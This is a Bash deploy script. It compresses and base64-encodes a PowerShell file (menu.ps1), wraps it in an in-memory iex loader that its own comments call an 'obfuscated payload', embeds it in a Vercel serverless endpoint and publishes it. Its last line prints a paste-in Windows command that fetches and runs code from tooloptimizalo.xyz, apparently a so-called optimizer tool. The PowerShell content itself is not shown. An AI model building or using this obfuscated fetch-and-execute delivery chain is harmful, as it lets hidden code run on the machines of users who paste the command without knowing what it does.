#!/usr/bin/env bash
set -e
cd "$(dirname "$0")"

echo "==> Generando payload ofuscado de menu.ps1..."

python3 - <<'PYEOF'
import gzip, base64, re

with open("menu.ps1", "rb") as f:
    raw = f.read()

compressed = gzip.compress(raw)
payload = base64.b64encode(compressed).decode()

loader = (
    "$d=[Convert]::FromBase64String('" + payload + "')\n"
    "$s=New-Object IO.MemoryStream(,$d)\n"
    "$g=New-Object IO.Compression.GZipStream($s,[IO.Compression.CompressionMode]::Decompress)\n"
    "iex (New-Object IO.StreamReader($g)).ReadToEnd()\n"
)

with open("api/menu.py", "r") as f:
    content = f.read()

# Actualizar _PAYLOAD
new_payload = '_PAYLOAD = (\n'
for i in range(0, len(payload), 76):
    new_payload += '    "' + payload[i:i+76] + '"\n'
new_payload += ')\n'
content = re.sub(r'_PAYLOAD = \(.*?\)\n', lambda m: new_payload, content, flags=re.DOTALL)

# Actualizar _LOADER
new_loader = '_LOADER = (\n    "' + loader.replace('\\', '\\\\').replace('"', '\\"').replace('\n', '\\n"\n    "') + '"\n)\n'
new_loader = new_loader.replace('\n    ""\n', '\n')  # eliminar lineas vacias finales
content = re.sub(r'_LOADER = \(.*?\)\n', lambda m: new_loader, content, flags=re.DOTALL)

with open("api/menu.py", "w") as f:
    f.write(content)

print("   Payload y loader actualizados en api/menu.py")
PYEOF

echo "==> Desplegando en Vercel..."
npx vercel --prod --yes
echo "==> Listo. Activo en https://tooloptimizalo.xyz"
echo "==> Comando Windows: powershell -c \"iex(irm tooloptimizalo.xyz/m)\""
